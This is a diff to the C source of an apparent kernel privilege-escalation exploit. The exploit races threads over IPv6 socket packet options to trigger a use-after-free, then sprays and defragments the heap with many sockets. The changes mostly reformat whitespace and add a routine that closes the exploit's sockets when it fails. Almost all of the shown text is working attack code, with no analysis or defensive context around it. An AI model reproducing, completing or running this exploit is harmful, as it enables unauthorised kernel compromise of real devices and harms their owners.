@@ -114,7 +114,7 @@ int name(int s) { \
     socklen_t l = sizeof(v); \
     if (getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &v, &l)) \
         *(volatile int*)0; \
-    return v; \
+        return v; \
 }
 
 GET_TCLASS(get_tclass)
@@ -136,6 +136,39 @@ static inline void refrain_from_caching(int sock) {
     (void)sock;
 }
 
+typedef struct {
+    int master_sock;
+    int kevent_sock;
+    int* spray_sock;
+    int spray_count;
+} exploit_state_t;
+
+void cleanup_on_failure(exploit_state_t* state) {
+    if (!state) return;
+
+    if (state->spray_sock) {
+        for (int i = 0; i < state->spray_count; i++) {
+            if (state->spray_sock[i] >= 0) {
+                safe_close_socket(state->spray_sock[i]);
+                state->spray_sock[i] = -1;
+            }
+        }
+    }
+
+    if (state->kevent_sock >= 0) {
+        safe_close_socket(state->kevent_sock);
+        state->kevent_sock = -1;
+    }
+
+    if (state->master_sock >= 0) {
+        safe_close_socket(state->master_sock);
+        state->master_sock = -1;
+    }
+
+    nanosleep(NANOSLEEP_100US, NULL);
+}
+
+
 void drain_socket_cache(void) {
     while (socket_cache_count > 0) {
         int s = socket_cache[--socket_cache_count];
@@ -144,7 +177,6 @@ void drain_socket_cache(void) {
             safe_close_socket(s);
     }
 }
-
 
 struct opaque {
     volatile int triggered;
@@ -174,11 +206,11 @@ void* use_thread(void* arg) {
     *(int*)CMSG_DATA((struct cmsghdr*)buf) = 0;
 
     while (!*(volatile int*)&o->triggered &&
-           get_tclass_2(o->master_sock) != TCLASS_SPRAY) {
+        get_tclass_2(o->master_sock) != TCLASS_SPRAY) {
         set_pktopts(o->master_sock, buf, sizeof(buf));
-    }
+        }
 
-    *(volatile int*)&o->triggered = 1;
+        *(volatile int*)&o->triggered = 1;
     *(volatile int*)&o->done1 = 1;
 
     return NULL;
@@ -207,32 +239,32 @@ void trigger_uaf(struct opaque* o) {
     pthread_t th1, th2;
     pthread_create(&th1, NULL, use_thread, o);
     pthread_create(&th2, NULL, free_thread, o);
-		
+
     nanosleep(NANOSLEEP_75US, NULL); // Critical timing window for race condition
 
     const int MAX_SPRAY = SPRAY_SIZE;
     int attempts = 0;
 
-	while (attempts++ < 1000) {
-		for (int i = 0; i < MAX_SPRAY; i++) {
-			int val = TCLASS_SPRAY;
-			if (setsockopt(o->spray_sock[i], IPPROTO_IPV6,
-						   IPV6_TCLASS, &val, sizeof(val))) {
-				reset_ipv6_opts(o->spray_sock[i]);
-			}
-		}
+    while (attempts++ < 1000) {
+        for (int i = 0; i < MAX_SPRAY; i++) {
+            int val = TCLASS_SPRAY;
+            if (setsockopt(o->spray_sock[i], IPPROTO_IPV6,
+                IPV6_TCLASS, &val, sizeof(val))) {
+                reset_ipv6_opts(o->spray_sock[i]);
+                }
+        }
 
-		if (get_tclass(o->master_sock) == TCLASS_SPRAY)
-			break;
+        if (get_tclass(o->master_sock) == TCLASS_SPRAY)
+            break;
 
-		if (o->triggered)
-			break;
+        if (o->triggered)
+            break;
 
-		for (int i = 0; i < MAX_SPRAY; i++) {
-			free_pktopts(o->spray_sock[i]);
-		}
-		nanosleep(NANOSLEEP_100US, NULL);
-	}
+        for (int i = 0; i < MAX_SPRAY; i++) {
+            free_pktopts(o->spray_sock[i]);
+        }
+        nanosleep(NANOSLEEP_100US, NULL);
+    }
 
     o->triggered = 1;
 
@@ -331,7 +363,7 @@ void targeted_heap_defragmentation(void) {
             }
         }
 
- 
+
         for (int i = 0; i < DEFRAG_LARGE_SOCKETS; i++) {
             defrag_large[i] = fast_new_socket();
             if (defrag_large[i] >= 0) {
@@ -417,7 +449,7 @@ int main() {
         if (i % 10 == 0)
             nanosleep(NANOSLEEP_10US, NULL);
     }
-	
+
     // Close initial 16 sockets for increased socket availability
     for (int i = 0; i < 16; i++)
         if (init_socks[i] >= 0)
@@ -430,6 +462,13 @@ int main() {
         if (spray_sock[i] < 0)
             *(volatile int*)0;
     }
+
+    exploit_state_t cleanup_state = {
+        .master_sock = master_sock,
+        .kevent_sock = kevent_sock,
+        .spray_sock = spray_sock,
+        .spray_count = SPRAY_TOTAL
+    };
 
     struct opaque o = {
         .master_sock = master_sock,
@@ -551,6 +590,9 @@ int main() {
         nanosleep(NANOSLEEP_50US, NULL);
 
     }
+
+    if (!exploit_success)
+        cleanup_on_failure(&cleanup_state);  // Only clean up if the exploit failed
 
     return exploit_success ? 0 : 1;
 }
